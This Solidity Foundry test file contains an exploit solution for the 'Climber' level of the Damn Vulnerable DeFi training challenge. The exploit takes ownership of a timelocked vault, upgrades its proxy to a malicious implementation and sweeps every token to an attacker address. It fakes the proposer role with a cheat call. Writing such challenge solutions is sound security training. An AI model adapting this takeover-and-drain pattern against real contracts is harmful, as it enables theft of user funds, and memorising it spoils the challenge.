// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {MaliciousVault} from "./MaliciousVault.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(
            ClimberVault(address(climberVaultProxy)).getSweeper(),
            sweeper
        );

        assertGt(
            ClimberVault(address(climberVaultProxy))
                .getLastWithdrawalTimestamp(),
            0
        );

        climberTimelock = ClimberTimelock(
            payable(ClimberVault(address(climberVaultProxy)).owner())
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer)
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer)
        );

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testClimberExploit() public {
        /** EXPLOIT START **/
        // 1. get access to timelock proposer role
        // cheating for now
        vm.prank(proposer);

        // 2. prepare schedule call with transferownership and updatedelay
        address[] memory climberVaultArr = new address[](1);
        uint256[] memory valueArr = new uint256[](1);
        bytes[] memory dataArr = new bytes[](1);

        climberVaultArr[0] = (address(climberVaultProxy));
        valueArr[0] = 0;
        dataArr[0] = abi.encodeWithSignature(
            "transferOwnership(address)",
            attacker
        );

        // 3.1 schedule call array
        climberTimelock.schedule(
            climberVaultArr,
            valueArr,
            dataArr,
            bytes32(0)
        );

        // 3.2 execute transaction
        vm.startPrank(attacker);
        climberTimelock.execute(climberVaultArr, valueArr, dataArr, bytes32(0));

        // 4. deploy and upgrade to malicious implementation
        MaliciousVault malVault = new MaliciousVault();
        ClimberVault(address(climberVaultProxy)).upgradeTo(address(malVault));

        // 5. set sweeper with fake withdraw function
        ClimberVault(address(climberVaultProxy)).withdraw(
            attacker,
            address(0x0),
            0
        );
        emit log_address(ClimberVault(address(climberVaultProxy)).getSweeper());
        assertEq(
            ClimberVault(address(climberVaultProxy)).getSweeper(),
            attacker
        );
        ClimberVault(address(climberVaultProxy)).sweepFunds(address(dvt));

        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
